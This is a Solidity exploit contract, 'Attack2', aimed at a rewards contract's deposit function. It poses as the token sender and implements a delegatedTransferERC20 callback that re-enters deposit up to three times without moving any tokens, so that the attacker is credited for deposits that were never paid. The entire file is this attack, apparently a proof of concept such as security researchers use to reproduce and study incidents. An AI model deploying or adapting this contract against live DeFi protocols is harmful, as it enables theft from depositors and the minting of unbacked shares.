pragma solidity 0.7.6;
import "./Ownable.sol";

interface IRewards {
    function deposit(
        uint256 visrDeposit,
        address payable from,
        address to
    ) external;
}

contract Attack2 is Ownable {
    IRewards public iRewards;
    uint256 public callTimes;

    address public attacker;

    constructor(address _iRewards) public {
        iRewards = IRewards(_iRewards);
        attacker = _msgSender();
    }

    function delegatedTransferERC20(
        address token,
        address to,
        uint256 amount
    ) public {
        if (callTimes == 3) {
            return;
        }
        callTimes++;
        iRewards.deposit(amount, payable(address(this)), attacker);
    }

    function attack(uint256 amount) public {
        callTimes++;
        iRewards.deposit(amount, payable(address(this)), attacker);
    }
}
